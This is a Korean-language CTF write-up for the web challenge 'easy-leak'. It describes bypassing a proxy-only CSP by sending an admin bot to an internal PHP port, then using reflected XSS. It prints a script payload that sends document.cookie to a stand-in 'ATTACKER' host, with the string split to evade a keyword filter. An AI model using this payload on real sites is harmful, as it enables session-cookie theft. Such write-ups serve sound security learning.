# easy-leak

> 스포일러: 이 문서는 문제의 분석 과정과 최종 풀이를 포함합니다.

## 개요

| 항목 | 내용 |
|---|---|
| 상태 | solved |
| 대회·플랫폼 | PwnSec CTF 2026 |
| 분야 | web |
| 난이도 | Medium |
| Flag 형식 | `pwnsec{...}` |

관리자 봇이 설정하는 `TOKEN` 쿠키를 유출한 뒤 `/api/verify`에 제출하는 문제다. 결정적인 관찰은 CSP가 PHP 애플리케이션 자체가 아니라 3000번 Caddy 프록시에서만 추가되며, PHP 개발 서버가 127.0.0.1의 9000~9003번 포트에서도 실행된다는 점이다.

## 환경 및 초기 분석

공식 입력은 [public.zip](../challenge/public.zip)이며, 압축 해제본은 `../challenge/web`과 `../challenge/bot`에 보존했다. 공용 Python 환경은 `../../../requirements.txt`로 복원한다.

`index.php`는 `content` 쿼리 값을 HTML 본문에 그대로 출력한다. 길이와 문자·키워드 필터는 있지만 `<script>` 자체는 허용된다. 공개 3000번 포트의 응답에는 `script-src 'none'`, `frame-src 'none'` 등의 CSP가 있어 일반적인 reflected XSS는 실행되지 않는다. 봇은 방문 직전에 `TOKEN_<16 hex>` 쿠키를 127.0.0.1 도메인에 설정하고 20초 동안 URL을 연다. 생성된 토큰은 60초 동안 `/api/verify`에서 유효하다.

## 핵심 분석

`entrypoint.sh`는 다음 네 PHP 서버를 먼저 시작한다.

```text
php -S 127.0.0.1:9000
php -S 127.0.0.1:9001
php -S 127.0.0.1:9002
php -S 127.0.0.1:9003
```

그 뒤 Caddy가 3000번에서 이 서버들로 reverse proxy하며 CSP 헤더를 추가한다. 따라서 봇이 접근할 수 있는 `http://127.0.0.1:9000/` 주소로 직접 이동하면 동일한 PHP 반사 지점을 사용하면서 CSP는 받지 않는다.

필터는 `http`와 `//`를 차단하므로 외부 수집 URL을 JavaScript 문자열 조각으로 나눴다.

```html
<script>location='h'+'ttps:'+'/'+'/ATTACKER/leak?token='+document.cookie</script>
```

봇의 방문은 top-level 요청이므로 `SameSite` 기본 정책과 무관하게 127.0.0.1 쿠키가 포함된다. 스크립트가 실행되면 `document.cookie`가 수집 서버로 전달된다. 실제 요청에서 `TOKEN_9d2e821e1c4d5b9d` 형태의 값을 확인했고, 이를 만료 전에 `/api/verify`에 제출해 플래그를 받았다.

## 풀이 및 재현

[solve.py](../solve.py)는 `instance.json`에서 web·bot endpoint를 읽고 임시 HTTP 수집 서버와 localhost.run reverse tunnel을 시작한다. 이후 내부 9000번 포트용 XSS URL을 `/api/report`에 전달하고, 콜백에서 토큰을 추출해 `/api/verify`에 제출한다.

Competition의 `.venv`를 활성화하고 challenge root에서 실행한다.

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

## 결과

`python solve.py`는 exit code 0, 빈 stderr, trailing newline 없는 24바이트 stdout으로 검증되었다.

```text
pwnsec{e9a7ecb6d57f3bd7}
```

## 정리 및 회고

CSP가 강하더라도 보호 헤더가 reverse proxy에서만 적용되면 내부 upstream 직접 접근으로 완전히 우회될 수 있다. 관리자 봇 문제에서는 공개 URL뿐 아니라 봇의 네트워크 관점에서 접근 가능한 upstream 포트와 sidecar 서비스를 함께 확인해야 한다. 또한 문자열 필터는 런타임 문자열 연결만으로 우회되므로 URL allowlist나 안전한 HTML 인코딩을 대신할 수 없다.

## 참고 자료

- [web/entrypoint.sh](../challenge/web/entrypoint.sh): PHP upstream 포트와 Caddy CSP 적용 위치 확인.
- [web/index.php](../challenge/web/index.php): 반사 지점과 키워드 필터 확인.
- [bot/conf.js](../challenge/bot/conf.js): 쿠키 설정, 봇 방문 시간, 내부 주소 확인.
- [bot/index.js](../challenge/bot/index.js): report·verify API와 토큰 유효 시간 확인.
